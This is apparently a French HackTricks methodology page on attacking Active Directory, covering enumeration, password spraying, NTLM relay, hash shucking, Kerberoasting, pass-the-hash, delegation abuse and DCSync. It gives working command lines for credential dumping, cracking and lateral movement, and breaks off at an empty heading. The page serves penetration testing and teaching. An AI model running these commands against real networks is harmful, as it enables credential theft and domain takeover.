# Méthodologie Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Vue d'ensemble

**Active Directory** sert de technologie fondamentale, permettant aux **administrateurs réseau** de créer et gérer efficacement les **domaines**, **utilisateurs** et **objets** au sein d'un réseau. Il est conçu pour monter en charge, facilitant l'organisation d'un grand nombre d'utilisateurs en **groupes** et **sous-groupes** gérables, tout en contrôlant les **droits d'accès** à différents niveaux.

La structure de **Active Directory** est composée de trois couches principales : **domaines**, **trees**, et **forests**. Un **domaine** englobe une collection d'objets, tels que des **utilisateurs** ou des **périphériques**, partageant une base de données commune. Les **trees** sont des groupes de ces domaines reliés par une structure partagée, et une **forest** représente l'ensemble de plusieurs trees, interconnectés via des **trust relationships**, formant la couche la plus haute de la structure organisationnelle. Des **droits d'accès** et de **communication** spécifiques peuvent être désignés à chacun de ces niveaux.

Concepts clés dans **Active Directory** :

1. **Directory** – Contient toutes les informations relatives aux objets Active Directory.
2. **Object** – Désigne les entités dans l'annuaire, incluant les **utilisateurs**, **groupes** ou **partages**.
3. **Domain** – Sert de conteneur pour les objets de l'annuaire, plusieurs domaines pouvant coexister dans une **forest**, chacun conservant sa propre collection d'objets.
4. **Tree** – Regroupement de domaines partageant un domaine racine commun.
5. **Forest** – Le sommet de la structure organisationnelle dans Active Directory, composé de plusieurs trees avec des **trust relationships** entre eux.

**Active Directory Domain Services (AD DS)** englobe un ensemble de services critiques pour la gestion centralisée et la communication au sein d'un réseau. Ces services comprennent :

1. **Domain Services** – Centralise le stockage des données et gère les interactions entre les **utilisateurs** et les **domaines**, y compris l'**authentication** et les fonctionnalités de **search**.
2. **Certificate Services** – Supervise la création, la distribution et la gestion des **certificats numériques** sécurisés.
3. **Lightweight Directory Services** – Prend en charge les applications utilisant l'annuaire via le **LDAP protocol**.
4. **Directory Federation Services** – Fournit des capacités de **single-sign-on** pour authentifier les utilisateurs à travers plusieurs applications web en une seule session.
5. **Rights Management** – Aide à protéger le contenu soumis aux droits d'auteur en régulant sa distribution et son utilisation non autorisée.
6. **DNS Service** – Crucial pour la résolution des **domain names**.

Pour une explication plus détaillée, consultez : [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

Pour apprendre à **attaquer un AD**, vous devez bien comprendre le **processus d'authentification Kerberos**.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Cheat Sheet

Vous pouvez consulter rapidement [https://wadcoms.github.io/](https://wadcoms.github.io) pour avoir une vue d'ensemble des commandes à exécuter pour énumérer/exploiter un AD.

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

Si vous avez simplement accès à un environnement AD mais que vous n'avez aucune credentials/sessions, vous pouvez :

- **Pentest the network:**
- Scannez le réseau, trouvez les machines et les ports ouverts et essayez d'**exploiter des vulnérabilités** ou d'**extraire des credentials** depuis celles-ci (par exemple, [les imprimantes peuvent être des cibles très intéressantes](ad-information-in-printers.md)).
- L'énumération DNS peut donner des informations sur les serveurs clés du domaine comme web, imprimantes, partages, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Consultez la [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) générale pour trouver plus d'informations sur la façon de procéder.
- **Check for null and Guest access on smb services** (cela ne fonctionnera pas sur les versions récentes de Windows) :
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Un guide plus détaillé sur comment énumérer un serveur SMB se trouve ici :


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Un guide plus détaillé sur l'énumération LDAP se trouve ici (prêtez une **attention particulière à l'accès anonyme**) :


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Récupérez des credentials en **usurpant des services avec Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Accédez à un hôte en [**abusant du relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Récupérez des credentials en **exposant** des [**fake UPnP services avec evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrayez des noms d'utilisateurs/noms complets depuis des documents internes, les réseaux sociaux, des services (principalement web) au sein des environnements du domaine et également depuis les sources accessibles publiquement.
- Si vous trouvez les noms complets des employés, vous pouvez essayer différentes conventions de **username AD** (**[read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)**)**. Les conventions les plus communes sont : _NameSurname_, _Name.Surname_, _NamSur_ (3 lettres de chaque), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _lettres aléatoires et 3 chiffres aléatoires_ (abc123).
- Outils :
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** Consultez les pages [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) et [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum** : Quand un **username invalide est demandé**, le serveur répondra avec le code d'erreur **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, nous permettant de déterminer que le username est invalide. Les **usernames valides** renverront soit un **TGT dans un AS-REP**, soit l'erreur _KRB5KDC_ERR_PREAUTH_REQUIRED_, indiquant que l'utilisateur doit effectuer une pré-authentication.
- **No Authentication against MS-NRPC**: Utiliser auth-level = 1 (No authentication) contre l'interface MS-NRPC (Netlogon) sur les domain controllers. La méthode appelle la fonction `DsrGetDcNameEx2` après avoir lié l'interface MS-NRPC pour vérifier si l'utilisateur ou l'ordinateur existe sans aucune credentials. L'outil [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implémente ce type d'énumération. La recherche peut être trouvée [ici](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Si vous trouvez l'un de ces serveurs sur le réseau, vous pouvez également effectuer une **énumération des utilisateurs** sur celui-ci. Par exemple, vous pouvez utiliser l'outil [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> However, you should have the **name of the people working on the company** from the recon step you should have performed before this. With the name and surname you could used the script [**namemash.py**](https://gist.github.com/superkojiman/11076951) to generate potential valid usernames.

### Knowing one or several usernames

Ok, so you know you have already a valid username but no passwords... Then try:

- [**ASREPRoast**](asreproast.md): If a user **doesn't have** the attribute _DONT_REQ_PREAUTH_ you can **request a AS_REP message** for that user that will contain some data encrypted by a derivation of the password of the user.
- [**Password Spraying**](password-spraying.md): Let's try the most **common passwords** with each of the discovered users, maybe some user is using a bad password (keep in mind the password policy!).
- Note that you can also **spray OWA servers** to try to get access to the users mail servers.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

You might be able to **obtain** some challenge **hashes** to crack **poisoning** some protocols of the **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)  to get access to the AD env.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** to keep AD recon state per engagement: `workspace create <name>` spawns per-protocol SQLite DBs under `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Switch views with `proto smb|mssql|winrm` and list gathered secrets with `creds`. Manually purge sensitive data when done: `rm -rf ~/.nxc/workspaces/<name>`.
- Quick subnet discovery with **`netexec smb <cidr>`** surfaces **domain**, **OS build**, **SMB signing requirements**, and **Null Auth**. Members showing `(signing:False)` are **relay-prone**, while DCs often require signing.
- Generate **hostnames in /etc/hosts** straight from NetExec output to ease targeting:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- When **SMB relay to the DC is blocked** by signing, probez quand même la posture **LDAP** : `netexec ldap <dc>` met en évidence `(signing:None)` / weak channel binding. Un DC exigeant SMB signing mais avec LDAP signing désactivé reste une cible viable **relay-to-LDAP** pour des abus comme **SPN-less RBCD**.

### Fuites côté client d'imprimante leaks → validation en masse des identifiants de domaine

- Les interfaces web/UI d'imprimantes intègrent parfois **des mots de passe admin masqués dans le HTML**. Afficher le code source/devtools peut révéler le texte en clair (p. ex., `<input value="<password>">`), permettant un accès Basic-auth aux dépôts de scan/impression.
- Les travaux d'impression récupérés peuvent contenir **documents d'intégration en clair** avec des mots de passe par utilisateur. Gardez les appariements alignés lors des tests:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Voler NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** avec l'**utilisateur null ou guest** vous pourriez **placer des fichiers** (comme un SCF file) qui, si d'une manière ou d'une autre sont ouverts, will t**rigger an NTLM authentication against you** afin que vous puissiez **steal** le **NTLM challenge** pour le cracker :

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** traite chaque NT hash que vous possédez déjà comme un mot de passe candidat pour d'autres formats plus lents dont le matériel de clé est dérivé directement du NT hash. Plutôt que de brute-forcer de longues phrases de passe dans Kerberos RC4 tickets, NetNTLM responses, ou cached credentials, vous fournissez les NT hashes aux modes NT-candidate de Hashcat et laissez l'outil valider la réutilisation de mot de passe sans jamais connaître le texte en clair. Ceci est particulièrement puissant après une compromission de domaine où vous pouvez récolter des milliers de NT hashes actuels et historiques.

Utilisez shucking quand :

- Vous avez un corpus NT issu de DCSync, dumps NTDS/SAM/SECURITY, ou des credential vaults et devez tester la réutilisation dans d'autres domaines/forests.
- Vous capturez du matériel Kerberos basé sur RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), des NetNTLM responses, ou des blobs DCC/DCC2.
- Vous voulez prouver rapidement la réutilisation pour de longues phrases de passe infranchissables et pivoter immédiatement via Pass-the-Hash.

La technique **ne fonctionne pas** contre les types de chiffrement dont les clés ne sont pas le NT hash (par ex., Kerberos etype 17/18 AES). Si un domaine impose AES-only, vous devez revenir aux modes mot de passe réguliers.

#### Building an NT hash corpus

- **DCSync/NTDS** – Use `secretsdump.py` with history to grab the largest possible set of NT hashes (and their previous values):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Les entrées d'historique élargissent considérablement le pool de candidats parce que Microsoft peut stocker jusqu'à 24 hashes précédents par compte. Pour d'autres méthodes pour récolter les secrets NTDS voir :

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrait les données locales SAM/SECURITY et les cached domain logons (DCC/DCC2). Dédupliquez et ajoutez ces hashes au même fichier `nt_candidates.txt`.
- **Track metadata** – Conservez le nom d'utilisateur/domaine qui a produit chaque hash (même si le wordlist contient seulement de l'hex). Les hash correspondants vous indiquent immédiatement quel principal réutilise un mot de passe une fois que Hashcat affiche le candidat gagnant.
- Préférez les candidats provenant du même forest ou d'un forest de confiance ; cela maximise la probabilité de chevauchement lors du shucking.

#### Hashcat NT-candidate modes

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notes :

- Les entrées NT-candidate **doivent rester des NT hashes bruts en 32-hex**. Désactivez les moteurs de règles (pas de `-r`, pas de modes hybrides) car le mangling corrompt le matériel de clé candidat.
- Ces modes ne sont pas intrinsèquement plus rapides, mais l'espace de clés NT (~30,000 MH/s sur un M3 Max) est ~100× plus rapide que Kerberos RC4 (~300 MH/s). Tester une liste NT triée coûte bien moins que d'explorer tout l'espace de mot de passe dans le format lent.
- Exécutez toujours la **dernière build de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) car les modes 31500/31600/35300/35400 ont été ajoutés récemment.
- Il n'existe actuellement pas de mode NT pour AS-REQ Pre-Auth, et les etypes AES (19600/19700) requièrent le mot de passe en clair car leurs clés sont dérivées via PBKDF2 à partir de mots de passe UTF-16LE, pas de NT hashes bruts.

#### Example – Kerberoast RC4 (mode 35300)

1. Capture an RC4 TGS for a target SPN with a low-privileged user (see the Kerberoast page for details):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck the ticket with your NT list:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat dérive la clé RC4 à partir de chaque candidat NT et valide le blob `$krb5tgs$23$...`. Une correspondance confirme que le compte de service utilise l'un de vos NT hashes existants.

3. Pivotez immédiatement via PtH :

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Vous pouvez éventuellement récupérer le texte en clair plus tard avec `hashcat -m 1000 <matched_hash> wordlists/` si nécessaire.

#### Example – Cached credentials (mode 31600)

1. Dump des cached logons depuis une workstation compromise :

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copiez la ligne DCC2 pour l'utilisateur de domaine intéressant dans `dcc2_highpriv.txt` et shuckez-la :

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Une correspondance réussie renvoie le NT hash déjà connu dans votre liste, prouvant que l'utilisateur en cache réutilise un mot de passe. Utilisez-le directement pour PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forcez-le en mode NTLM rapide pour récupérer la chaîne.

Le même workflow s'applique aux NetNTLM challenge-responses (`-m 27000/27100`) et DCC (`-m 31500`). Une fois une correspondance identifiée vous pouvez lancer des relais, SMB/WMI/WinRM PtH, ou re-cracker le NT hash avec des masks/règles offline.

## Énumération d'Active Directory AVEC credentials/session

Pour cette phase vous devez avoir **compromis les credentials ou une session** d'un compte de domaine valide. Si vous disposez de credentials valides ou d'un shell en tant qu'utilisateur de domaine, **rappelez-vous que les options données précédemment restent des moyens pour compromettre d'autres utilisateurs**.

Avant de commencer l'énumération authentifiée, vous devriez connaître le **Kerberos double hop problem**.

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Énumération

Avoir compromis un compte est une **étape importante pour commencer à compromettre tout le domaine**, car vous allez pouvoir démarrer l'**Active Directory Enumeration :**

Concernant [**ASREPRoast**](asreproast.md) vous pouvez maintenant trouver tous les utilisateurs vulnérables possibles, et concernant [**Password Spraying**](password-spraying.md) vous pouvez obtenir une **liste de tous les noms d'utilisateurs** et essayer le mot de passe du compte compromis, les mots de passe vides et de nouveaux mots de passe prometteurs.

- Vous pouvez utiliser le [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Vous pouvez aussi utiliser [**powershell for recon**](../basic-powershell-for-pentesters/index.html) qui sera plus discret
- Vous pouvez également [**use powerview**](../basic-powershell-for-pentesters/powerview.md) pour extraire des informations plus détaillées
- Un autre outil incroyable pour le recon dans Active Directory est [**BloodHound**](bloodhound.md). Ce n'est **pas très stealthy** (selon les méthodes de collecte que vous utilisez), mais **si cela ne vous importe pas**, vous devriez vraiment l'essayer. Trouvez où les utilisateurs peuvent RDP, trouvez des chemins vers d'autres groupes, etc.
- **Autres outils automatisés d'énumération AD :** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) car ils peuvent contenir des informations intéressantes.
- Un **outil avec GUI** que vous pouvez utiliser pour énumérer l'annuaire est **AdExplorer.exe** de la suite **SysInternal**.
- Vous pouvez aussi rechercher dans la base LDAP avec **ldapsearch** pour chercher des credentials dans les champs _userPassword_ & _unixUserPassword_, ou même dans _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) pour d'autres méthodes.
- Si vous utilisez **Linux**, vous pouvez également énumérer le domaine en utilisant [**pywerview**](https://github.com/the-useless-one/pywerview).
- Vous pouvez aussi essayer des outils automatisés tels que :
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraction de tous les utilisateurs du domaine**

Il est très facile d'obtenir tous les noms d'utilisateurs du domaine depuis Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). Sous Linux, vous pouvez utiliser : `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Même si cette section Énumération semble courte, c'est la partie la plus importante de toutes. Accédez aux liens (principalement ceux de cmd, powershell, powerview et BloodHound), apprenez à énumérer un domaine et entraînez-vous jusqu'à ce que vous soyez à l'aise. Lors d'une évaluation, ce sera le moment clé pour trouver votre chemin vers DA ou pour décider qu'il n'y a rien à faire.

### Kerberoast

Kerberoasting consiste à obtenir des **TGS tickets** utilisés par des services liés à des comptes utilisateurs et à cracker leur chiffrement — qui est basé sur les mots de passe utilisateurs — **offline**.

Plus d'informations ici :

{{#ref}}
kerberoast.md
{{#endref}}

### Connexion distante (RDP, SSH, FTP, Win-RM, etc)

Une fois que vous avez obtenu des credentials, vous pouvez vérifier si vous avez accès à une **machine**. Pour cela, vous pouvez utiliser **CrackMapExec** pour tenter de vous connecter à plusieurs serveurs via différents protocoles, en fonction de vos scans de ports.

### Local Privilege Escalation

Si vous avez compromis des credentials ou une session en tant qu'utilisateur de domaine régulier et que vous avez **accès** avec cet utilisateur à **n'importe quelle machine du domaine** vous devriez essayer de trouver un moyen d'**escalader les privilèges localement et loot pour des credentials**. En effet, ce n'est qu'avec des privilèges administrateur local que vous pourrez **dumper les hashes d'autres utilisateurs** en mémoire (LSASS) et localement (SAM).

Il y a une page complète dans ce livre à propos de [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) et une [**checklist**](../checklist-windows-privilege-escalation.md). Aussi, n'oubliez pas d'utiliser [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Il est très **peu probable** que vous trouviez des **tickets** dans l'utilisateur courant vous donnant la permission d'accéder à des ressources inattendues, mais vous pouvez vérifier :
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Si vous avez réussi à énumérer l'Active Directory vous disposerez de **plus d'adresses e-mail et d'une meilleure compréhension du réseau**. Vous pourriez être en mesure de forcer des NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Rechercher des Creds dans les partages d'ordinateurs | SMB Shares

Maintenant que vous avez quelques credentials de base, vous devriez vérifier si vous pouvez **trouver** des **fichiers intéressants partagés dans l'AD**. Vous pouvez le faire manuellement mais c'est une tâche très ennuyeuse et répétitive (et encore plus si vous trouvez des centaines de docs à vérifier).

[**Suivez ce lien pour en savoir plus sur les outils que vous pouvez utiliser.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Voler des NTLM Creds

Si vous pouvez **accéder à d'autres PC ou partages** vous pouvez **placer des fichiers** (comme un fichier SCF) qui, s'ils sont consultés, vont **déclencher une authentification NTLM contre vous** afin que vous puissiez **voler** le **challenge NTLM** pour le craquer :


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Cette vulnérabilité permettait à tout utilisateur authentifié de **compromettre le contrôleur de domaine**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalade de privilèges sur Active Directory AVEC des credentials/session privilégiés

**Pour les techniques suivantes, un utilisateur de domaine classique ne suffit pas : vous avez besoin de privilèges/credentials spéciaux pour effectuer ces attaques.**

### Extraction de hash

Idéalement vous avez réussi à **compromettre un compte local admin** en utilisant [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) y compris le relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Ensuite, il est temps de dumper tous les hashes en mémoire et localement.\
[**Lisez cette page sur les différentes manières d'obtenir les hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Une fois que vous avez le hash d'un utilisateur**, vous pouvez l'utiliser pour **vous faire passer pour lui**.\
Vous devez utiliser un **outil** qui **effectue** l'**authentification NTLM en utilisant** ce **hash**, **ou** vous pouvez créer un nouveau **sessionlogon** et **injecter** ce **hash** dans le **LSASS**, de sorte que lorsqu'une **authentification NTLM** est effectuée, ce **hash sera utilisé.** La dernière option est celle utilisée par mimikatz.\
[**Lisez cette page pour plus d'informations.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Cette attaque vise à **utiliser le hash NTLM d'un utilisateur pour demander des tickets Kerberos**, comme alternative au Pass The Hash classique sur le protocole NTLM. Par conséquent, cela peut être particulièrement **utile dans les réseaux où le protocole NTLM est désactivé** et où seul **Kerberos** est autorisé comme protocole d'authentification.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Dans la méthode d'attaque **Pass The Ticket (PTT)**, les attaquants **volent le ticket d'authentification d'un utilisateur** au lieu de son mot de passe ou de ses valeurs de hash. Ce ticket volé est ensuite utilisé pour **se faire passer pour l'utilisateur**, obtenant un accès non autorisé aux ressources et services du réseau.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Réutilisation des Credentials

Si vous avez le **hash** ou le **password** d'un **local administrator** vous devriez essayer de **vous connecter localement** à d'autres **PCs** avec celui-ci.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Notez que ceci est assez **bruyant** et que **LAPS** l'**atténuerait**.

### MSSQL Abuse & Trusted Links

Si un utilisateur a les privilèges pour **accéder à des instances MSSQL**, il pourrait les utiliser pour **exécuter des commandes** sur l'hôte MSSQL (si elles tournent en tant que SA), **voler** le **hash** NetNTLM ou même effectuer une **relay** **attack**.\
Aussi, si une instance MSSQL est trusted (database link) par une autre instance MSSQL. Si l'utilisateur a des privilèges sur la base de données trusted, il pourra **utiliser la relation de trust pour exécuter des requêtes aussi dans l'autre instance**. Ces trusts peuvent être enchaînés et à un moment donné l'utilisateur pourrait trouver une base de données mal configurée où il peut exécuter des commandes.\
**Les liens entre bases de données fonctionnent même à travers des forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Les suites tierces d'inventaire et de déploiement exposent souvent des chemins puissants vers des identifiants et l'exécution de code. Voir :

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Si vous trouvez un objet Computer avec l'attribut [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) et que vous possédez des privilèges de domaine sur l'ordinateur, vous pourrez dumper les TGTs depuis la mémoire de tous les utilisateurs qui se connectent sur cet ordinateur.\
Ainsi, si un **Domain Admin se connecte sur l'ordinateur**, vous pourrez dumper son TGT et l'usurper en utilisant [Pass the Ticket](pass-the-ticket.md).\
Grâce à constrained delegation vous pourriez même **compromettre automatiquement un Print Server** (espérons que ce soit un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Si un user ou computer est autorisé pour la "Constrained Delegation", il pourra **usurper n'importe quel utilisateur pour accéder à certains services sur une machine**.\
Ensuite, si vous **compromettez le hash** de cet user/computer vous pourrez **usurper n'importe quel utilisateur** (même des domain admins) pour accéder à certains services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Avoir le privilège **WRITE** sur un objet Active Directory d'un ordinateur distant permet d'obtenir une exécution de code avec des **privilèges élevés** :


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

L'utilisateur compromis pourrait avoir des **privilèges intéressants sur certains objets de domaine** qui pourraient vous permettre de **se déplacer latéralement / escalader** des privilèges.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Découvrir un **service Spool écoutant** dans le domaine peut être **abusé** pour **acquérir de nouveaux identifiants** et **escalader des privilèges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Si **d'autres utilisateurs** **accèdent** à la machine **compromise**, il est possible de **récupérer des credentials depuis la mémoire** et même **injecter des beacons dans leurs processus** pour les usurper.\
Généralement les utilisateurs accèdent au système via RDP, voici donc comment effectuer quelques attaques sur des sessions RDP tierces :


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fournit un système pour gérer le **mot de passe Administrator local** sur les ordinateurs joints au domaine, en s'assurant qu'il est **aléatoire**, unique et fréquemment **changé**. Ces mots de passe sont stockés dans Active Directory et l'accès est contrôlé via des ACLs pour des utilisateurs autorisés uniquement. Avec des permissions suffisantes pour accéder à ces mots de passe, il devient possible de pivoter vers d'autres machines.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Récupérer des certificats** depuis la machine compromise peut être un moyen d'escalader les privilèges à l'intérieur de l'environnement :


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Si des **templates vulnérables** sont configurés, il est possible de les abuser pour escalader des privilèges :


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Une fois que vous obtenez des privilèges **Domain Admin** ou encore mieux **Enterprise Admin**, vous pouvez **dumper** la **base de données de domaine** : _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

